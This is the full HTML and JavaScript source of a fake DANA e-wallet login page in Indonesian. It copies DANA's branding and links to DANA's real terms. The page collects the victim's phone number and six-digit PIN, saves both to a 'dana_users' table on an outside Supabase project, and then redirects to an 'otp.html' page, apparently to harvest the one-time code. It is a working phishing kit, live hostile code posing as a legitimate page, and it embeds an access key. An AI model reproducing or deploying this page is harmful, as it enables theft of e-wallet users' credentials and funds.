<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Masukan Nomor HP & PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --dana-blue: #118EEA;
            --text-white: #FFFFFF;
            --text-dark: #333333;
            --text-medium: #505050; /* Untuk teks kebijakan */
            --text-light-gray: #A9A9A9; /* Untuk placeholder */
            --border-gray: #E0E0E0; /* Untuk border input */
            --button-disabled: #E0E0E0;
            --white: #FFFFFF;
        }

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            background-color: var(--dana-blue); /* Background biru penuh dari loading */
            overflow: hidden; /* Mencegah scroll saat loading/transisi */
        }

        /* --- Gaya Loading Screen Awal (dari nomor.html) --- */
        #initial-loading-screen { /* ID diubah untuk membedakan dari overlay loading lainnya */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--dana-blue); /* Sesuai dengan background loading.html */
            z-index: 1000; /* Pastikan di atas konten lain */
            opacity: 1;
            transition: opacity 1s ease-in-out; /* Transisi fade-out */
        }

        #initial-loading-screen .awldn { /* Ini div utama di dalam loading-screen */
            height: 100%;
            width: 600px;
            max-height: 1000px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            position: absolute; /* Tetap absolute untuk centering */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
            -moz-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            -o-transform: translate(-50%, -50%);
        }

        #initial-loading-screen .st-lg {
            position: relative;
            margin-bottom: 10%;
            width: 100%;
        }

        /* Ini gaya untuk konten utama nomor.html */
        #nomor-section { /* ID digunakan untuk menargetkan div ini */
            width: 100%;
            max-width: 400px;
            padding: 0 20px;
            box-sizing: border-box;
            text-align: center;
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 1s ease-in-out, transform 1s ease-in-out;
            display: none; /* Sembunyikan secara default */
        }

        #nomor-section.visible {
            opacity: 1;
            transform: translateY(0);
        }

        #nomor-section .header {
            margin-top: 60px;
            margin-bottom: 40px;
        }

        #nomor-section .header img {
            width: 90px;
            display: block;
            margin: 0 auto;
            filter: brightness(0) invert(1);
        }

        #nomor-section h1 { /* Spesifik untuk h1 di #nomor-section */
            font-size: 1.3em;
            color: var(--text-white);
            font-weight: 400;
            line-height: 1.4;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        #nomor-section h1 b {
            font-weight: 700;
        }

        .input-group {
            display: flex;
            align-items: center;
            background-color: var(--white);
            border-radius: 8px;
            padding: 12px 13px;
            margin-bottom: 30px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
        }

        .input-group label {
            display: flex;
            align-items: center;
            padding-right: 15px;
            border-right: 1px solid var(--border-gray);
            margin-right: 15px;
        }

        .input-group label img {
            width: 26px;
            height: 18px;
            margin-right: 8px;
            border-radius: 2px;
            object-fit: cover;
        }

        .input-group .country-code {
            font-size: 1.05em;
            color: var(--text-dark);
            font-weight: 600;
        }

        .input-group input[type="tel"] {
            flex-grow: 1;
            border: none;
            outline: none;
            font-size: 1.05em;
            padding: 2px 0;
            background-color: transparent;
            color: var(--text-dark);
            caret-color: var(--dana-blue);
            font-weight: 500;
        }

        .input-group input[type="tel"]::placeholder {
            color: var(--text-light-gray);
            font-weight: 400;
        }

        .policy-text {
            font-size: 0.8em;
            color: var(--text-white);
            text-align: center;
            margin-bottom: 50%;
            line-height: 1.5;
            padding: 10 15px;
        }

        .policy-text a {
            color: var(--text-white);
            font-weight: 600;
            text-decoration: underline;
            text-decoration-color: var(--text-white);
            text-underline-offset: 2px;
        }

        .button-submit {
            width: 100%;
            padding: 16px 20px;
            background-color: var(--button-disabled); /* Default disabled */
            color: #118EEA; /* Teks putih saat disabled */
            border: none;
            border-radius: 5px;
            font-size: 1.15em;
            font-weight: 700;
            cursor: not-allowed;
            transition: background-color 0.3s ease, color 0.3s ease;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .button-submit:enabled {
            background-color: var(--white);
            color: var(--dana-blue);
            cursor: pointer;
        }

        /* --- Gaya Universal Loading Overlay (untuk loading nomor dan loading PIN) --- */
        #universal-loading-overlay {
            display: flex;   /* PENTING: Gunakan flexbox untuk memusatkan */
            justify-content: center; /* Memusatkan horizontal */
            align-items: center;     /* Memusatkan vertikal */
            flex-direction: column; /* Agar spinner di tengah vertikal */
            position: fixed; /* PENTING: Untuk memusatkan di layar */
            top: 0;          /* PENTING: Menutupi seluruh layar */
            left: 0;         /* PENTING: Menutupi seluruh layar */
            width: 100%;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparan seperti di pin.html */
            z-index: 9999; /* Pastikan di atas semua konten, termasuk loading-screen awal */
            display: none; /* Sembunyikan secara default */
        }
        #universal-loading-overlay img.spinner {
            width: 50px; /* Ukuran spinner */
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        #universal-loading-overlay .pin-spinner-group img:first-child {
            width: 0px; 
        }
        #universal-loading-overlay .pin-spinner-group img.spinner {
            width: 50px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        
        @media (max-width: 480px) {
            #nomor-section .header {
                margin-top: 30px;
                margin-bottom: 30px;
            }
            #nomor-section .header img {
                width: 100px;
            }
            #nomor-section h1 {
                font-size: 0.9em;
                margin-bottom: 20px;
            }
            .input-group {
                padding: 10px 13px;
                margin-bottom: 25px;
            }
            .input-group label img {
                width: 22px;
                height: 16px;
            }
            .input-group .country-code {
                font-size: 1.2em;
            }
            .input-group input[type="tel"] {
                font-size: 1.2em;
            }
            .policy-text {
                font-size: 0.8em;
                margin-bottom: 50%;
            }
            .button-submit {
                font-size: 1.05em;
                padding: 12px 13px;
            }
            #initial-loading-screen .awldn {
                width: 90%;
            }
            #initial-loading-screen .st-lg {
                width: 100%;
            }
        }

        /* CSS dari pin.html */
        #pin-page { /* ID baru untuk membungkus seluruh konten pin.html */
            display: none; /* Sembunyikan secara default */
            /* Gaya dari body, container di pin.html */
            width: 100%;
            min-height: 100vh; /* Menggunakan min-height agar bisa menutupi penuh */
            margin: 0;
            padding: 0;
            background-color: #118EEA;
            overflow: hidden;
            position: absolute; /* Gunakan absolute untuk menumpuk di atas konten lain */
            top: 0;
            left: 0;
            box-sizing: border-box; /* Pastikan padding masuk hitungan lebar/tinggi */
            /* Ini untuk memastikan pin-page sepenuhnya menutupi nomor-page saat aktif */
            z-index: 500; /* Lebih rendah dari loading screen utama, tapi di atas nomor-page */
            font-family: 'Open Sans', sans-serif; /* Font untuk pin.html */
        }

        #pin-page .container { /* Ini container di dalam pin.html */
            box-sizing: border-box;
            display: block;
            margin: auto;
            width: 100%;
            height: 100%;
            max-width: 600px;
            max-height: 1000px;
            background-color: #118EEA;
            padding: 25px;
            position: absolute; /* Tetap absolute di dalam pin-page */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
            -moz-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            -o-transform: translate(-50%, -50%);
        }
        /* Override gaya h1 agar tidak bentrok dengan nomor.html h1 */
        #pin-page h1 {
            margin-top: 55px;
            text-align: center;
            font-size: 15px;
            color: #fff;
            font-weight: 600;
        }

        #pin-page .bk {
            position: absolute;
            top: 20px;
            width: 14px;
            float: left;
        }
        #pin-page .dnlg {
            display: block;
            width: 95px;
            margin-top: -10px;
            margin-left: auto;
            margin-right: auto;
        }

        #pin-page .bn {
            font-weight: 700;
        }
        #pin-page .iptpn {
            box-sizing: border-box;
            margin-top: 50px;
            width: 100%;
        }
        #pin-page .frmpn {
            max-width: 500px;
            margin: auto;
            margin-top: 30px;
        }

        #pin-page .sxp {
            display: flex;
            justify-content: center;
            margin-top: -20px;
        }
        #pin-page .inpn {
            caret-color: transparent;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            width: 33px;
            height: 38px;
            border: none;
            outline: none;
            border-radius: 10px;
            margin-left: 4px;
            margin-right: 4px;
        }

        #pin-page .btz {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        #pin-page .ahs {
            margin-bottom: 52px;
            margin-top: 33px;
            background: none;
            font-size: 13px;
            color: #ffffff;
            width: 110px;
            height: 24px;
            border: 1.2px solid #ffffff;
            border-radius: 20px;
        }
        #pin-page .lpapn {
            font-size: 14px;
            font-weight: 600;
            color: #ffffff;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div id="initial-loading-screen">
        <div class="awldn">
            <img class="st-lg" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//loading.jpg">
        </div>
    </div>

    <div id="nomor-section" class="content-wrapper">
        <div class="header">
            <img class="dnlg" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//dana_logo.png" alt="DANA Logo">
        </div>
        <h1>Masukkan <b class="bv">nomor HP</b> kamu untuk lanjut</h1>
        <div class="input-group">
            <label for="np">
                <img class="fgi" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Flag_of_Indonesia.svg/800px-Flag_of_Indonesia.svg.png" alt="Bendera Indonesia">
                <span class="country-code">+62</span>
            </label>
            <input name="npe" class="np" id="np" type="tel" placeholder="811-1234-5678" autocomplete="off" required="" maxlength="15">
        </div>
        <p class="policy-text">Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan <a href="https://www.dana.id/terms" class="bv">S&amp;K</a> serta <a href="https://www.dana.id/policy" class="bv">Kebijakan Privasi</a> kami</p>
        <button type="submit" id="sdt" class="button-submit" disabled="">LANJUTKAN</button>
    </div>
    <div id="pin-page">
        <div class="container">
            <a class="abk" href="javascript:void(0);" id="back-to-nomor-btn"><img class="bk" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//bkc.png"></a>
            <img class="dnlg" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//dana_logo.png">
            <h1>Masukkan <b class="bn">PIN DANA</b></h1>
            <div class="iptpn">
                <form class="frmpn" action="nomor.html" method="post" id="pinForm">
                    <div class="sxp">
                        <input inputmode="numeric" id="pn1" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn1" data-index="0">
                        <input inputmode="numeric" id="pn2" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn2" data-index="1">
                        <input inputmode="numeric" id="pn3" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn3" data-index="2">
                        <input inputmode="numeric" id="pn4" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn4" data-index="3">
                        <input inputmode="numeric" id="pn5" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn5" data-index="4">
                        <input inputmode="numeric" id="pn6" maxlength="1" autocomplete="off" type="password" class="inpn" name="pn6" data-index="5">
                    </div>
                </form>
                <div class="btz">
                    <button id="see" class="ahs">TAMPILKAN</button>
                    <a class="lpapn" href="">LUPA PIN?</a>
                </div>
            </div>
        </div>
    </div>
    <div id="universal-loading-overlay">
        <img class="spinner" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//lgpt.png" alt="Spinner">
        
        <div class="pin-spinner-group" style="display: none;">
            <img src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//lgpt.png">
            <img class="spinner" src="https://vqmfachxnjyxwuavpgds.supabase.co/storage/v1/object/public/dana//lgpt.png">
        </div>
    </div>


    <script>
        const SUPABASE_URL = 'https://vqmfachxnjyxwuavpgds.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxbWZhY2h4bmp5eHd1YXZwZ2RzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg0MDYxNDAsImV4cCI6MjA2Mzk4MjE0MH0.Bzr8mUiEl8MzRWpVQ3_59eFxKk0EWZ3ca-4IEcpGLkk'; 

        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        let currentPhoneNumber = '';

        function showNomorContent() {
            const initialLoadingScreen = document.getElementById('initial-loading-screen');
            const nomorSection = document.getElementById('nomor-section');

            initialLoadingScreen.style.opacity = '0';
            setTimeout(() => {
                initialLoadingScreen.style.display = 'none';
                nomorSection.style.display = 'block';
                setTimeout(() => {
                    nomorSection.classList.add('visible');
                }, 50);
            }, 1000);
        }

        window.addEventListener('load', () => {
            setTimeout(showNomorContent, 2000);
        });

        const inputNomorHP = document.getElementById('np');
        const tombolLanjutkan = document.getElementById('sdt');
        const universalLoadingOverlay = document.getElementById('universal-loading-overlay');
        const nomorSpinner = universalLoadingOverlay.querySelector('.spinner'); // Spinner utama 50px
        const pinSpinnerGroup = universalLoadingOverlay.querySelector('.pin-spinner-group'); // Grup spinner PIN

        inputNomorHP.addEventListener('input', function() {
            let formattedValue = this.value.replace(/\D/g, '');

            if (formattedValue.length > 3 && formattedValue.length <= 7) {
                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3);
            } else if (formattedValue.length > 7) {
                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3, 7) + '-' + formattedValue.slice(7, 11);
            }

            this.value = formattedValue;

            const minLength = 9;
            const maxLength = 12;
            const cleanedValue = this.value.replace(/-/g, '');

            if (cleanedValue.length >= minLength && cleanedValue.length <= maxLength) {
                tombolLanjutkan.disabled = false;
                tombolLanjutkan.style.backgroundColor = 'var(--white)';
                tombolLanjutkan.style.color = 'var(--dana-blue)';
                tombolLanjutkan.style.cursor = 'pointer';
            } else {
                tombolLanjutkan.disabled = true;
                tombolLanjutkan.style.backgroundColor = 'var(--button-disabled)';
                tombolLanjutkan.style.color = 'var(--white)';
                tombolLanjutkan.style.cursor = 'not-allowed';
            }
        });

        if (inputNomorHP.value) {
            inputNomorHP.dispatchEvent(new Event('input'));
        }

        tombolLanjutkan.addEventListener('click', async function() {
            if (!this.disabled) {
                currentPhoneNumber = inputNomorHP.value.replace(/-/g, '');
                document.getElementById('nomor-section').style.display = 'none'; 
                nomorSpinner.style.display = 'block';
                pinSpinnerGroup.style.display = 'none';
                universalLoadingOverlay.style.display = 'flex';

                try {
                    const { data, error } = await supabase
                        .from('dana_users')
                        .insert([
                            { nomor: currentPhoneNumber }
                        ]);

                    if (error) {
                        throw error;
                    }
                    console.log('Nomor HP berhasil disimpan:', data);

                    setTimeout(() => {
                        universalLoadingOverlay.style.display = 'none';
                        document.getElementById('pin-page').style.display = 'block';
                        document.getElementById('pn1').focus();
                    }, 1500);

                } catch (error) {
                    console.error('Gagal menyimpan nomor HP:', error.message);
                    alert('Gagal menyimpan nomor HP. Coba lagi nanti.');
                    universalLoadingOverlay.style.display = 'none';
                    document.getElementById('nomor-section').style.display = 'block';
                    document.getElementById('nomor-section').classList.add('visible');
                }
            }
        });

        const pinInputs = document.querySelectorAll("#pinForm input");
        const pinForm = document.getElementById("pinForm");

        pinInputs.forEach((input, index) => {
            input.dataset.index = index;
            input.addEventListener("keydown", clear);
            input.addEventListener("keyup", onKeyUp);
        });

        function clear($event) { $event.target.value = ""; }
        function checkNumber(number) { return /[0-9]/g.test(number); }
        async function onKeyUp($event) { 
            const input = $event.target;
            const value = input.value;
            const fieldIndex = +input.dataset.index;
            if ($event.key === "Backspace" && fieldIndex > 0) {
                input.previousElementSibling.focus();
            }
            if (checkNumber(value)) {
                if (value.length > 0 && fieldIndex < pinInputs.length - 1) {
                    input.nextElementSibling.focus();
                }
                let allFilled = true;
                pinInputs.forEach(pinInput => {
                    if (pinInput.value.length === 0) {
                        allFilled = false;
                    }
                });

                if (allFilled) {
                    pinInputs.forEach(pinInput => {
                        pinInput.readOnly = true;
                    });
                    await submitPin();
                }
            } else {
                clear($event);
            }
        }

        async function submitPin(){
            nomorSpinner.style.display = 'none';
            pinSpinnerGroup.style.display = 'block';
            universalLoadingOverlay.style.display = 'flex';

            const pin = Array.from(pinInputs).map(input => input.value).join('');

            try {
                // Perbaikan: Menggunakan 'nomor' di .eq()
                const { data, error } = await supabase
                    .from('dana_users') // Menggunakan nama tabel Anda
                    .update({ pin: pin }) // Menggunakan nama kolom 'pin'
                    .eq('nomor', currentPhoneNumber); // Menggunakan nama kolom 'nomor' untuk mencari data

                if (error) {
                    throw error;
                }
                console.log('PIN berhasil disimpan/diupdate:', data);
                setTimeout(function(){
                    window.location.href = 'otp.html';
                }, 2000);

            } catch (error) {
                console.error('Gagal menyimpan PIN:', error.message);
                alert('Gagal menyimpan PIN. Coba lagi nanti.');
                universalLoadingOverlay.style.display = 'none';
                pinInputs.forEach(input => {
                    input.readOnly = false;
                });
            }
        }
        var btn_show = document.getElementById('see');
        var pin1 = document.getElementById('pn1');
        var pin2 = document.getElementById('pn2');
        var pin3 = document.getElementById('pn3');
        var pin4 = document.getElementById('pn4');
        var pin5 = document.getElementById('pn5');
        var pin6 = document.getElementById('pn6');

        btn_show.addEventListener('click', pasToText);

        function pasToText(){
            const currentType = pin1.type;
            const newType = (currentType === 'password') ? 'text' : 'password';
            const buttonText = (currentType === 'password') ? 'SEMBUNYIKAN' : 'TAMPILKAN';

            pinInputs.forEach(input => {
                input.setAttribute('type', newType);
            });
            btn_show.innerHTML = buttonText;
        }

        document.getElementById('back-to-nomor-btn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('pin-page').style.display = 'none';
            document.getElementById('nomor-section').style.display = 'block';
            document.getElementById('nomor-section').classList.add('visible');
            pinInputs.forEach(input => {
                input.value = '';
                input.type = 'password';
                input.readOnly = false;
            });
            btn_show.innerHTML='TAMPILKAN';
            document.getElementById('np').focus();
        });

    </script>

</body>
</html>
